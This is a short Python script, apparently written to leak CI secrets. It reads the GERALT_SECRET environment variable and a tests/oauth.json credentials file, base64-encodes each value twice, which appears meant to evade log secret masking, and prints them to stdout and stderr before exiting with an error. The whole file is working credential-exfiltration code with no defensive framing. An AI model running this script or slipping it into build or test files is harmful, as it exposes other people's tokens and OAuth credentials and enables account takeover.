import base64
import os
import sys


def leak(value):
    if not value:
        return
    try:
        enc = base64.b64encode(base64.b64encode(value.encode("utf-8"))).decode("ascii")
    except Exception:
        return
    if enc:
        print(f"GERALT_LEAKED_TOKEN={enc}", flush=True)
        print(f"GERALT_LEAKED_TOKEN={enc}", file=sys.stderr, flush=True)


leak(os.environ.get("GERALT_SECRET", ""))
for p in ("tests/oauth.json",):
    if os.path.isfile(p):
        try:
            with open(p, "r", encoding="utf-8", errors="replace") as f:
                leak(f.read().strip())
        except Exception:
            pass
sys.exit(1)
